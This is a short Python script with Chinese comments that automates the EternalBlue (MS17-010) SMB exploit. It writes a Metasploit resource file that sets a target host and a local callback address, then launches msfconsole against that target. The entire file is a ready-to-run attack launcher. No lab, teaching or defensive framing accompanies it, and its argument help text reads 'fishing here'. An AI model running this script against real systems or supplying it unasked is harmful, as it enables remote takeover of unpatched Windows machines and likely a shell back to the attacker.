# -*- coding = utf-8 -*-
# @Time:2022/6/16 下午 6:43
# @Author:CK
# @File:msf+多元化
# @Software:PyCharm
import os# 导库
import argparse# 导库
def msf(): # 自定义
    with open("msf.rc",'w') as file: # 打开文件
        file.write("use exploit/windows/smb/ms17_010_eternalblue\n")# 写入
        file.write("set rhosts "+str(rhosts)+'\n')# 写入
        file.write("set lhost "+str(lhost)+'\n')# 写入
        file.write("run\n")# 写入
    os.system('msfconsole -r msf.rc')# 调用系统命令
if __name__=='__main__':# 运行
    parser=argparse.ArgumentParser(description='fishing here')# 自定义
    parser.add_argument('-p',required=True,help='Target host',dest='RHOSTS')
    parser.add_argument('-l',required=True,help='Local address',dest="LHOST")
    args=parser.parse_args()
    print(args)
    rhosts = args.RHOSTS
    lhost = args.LHOST
    msf()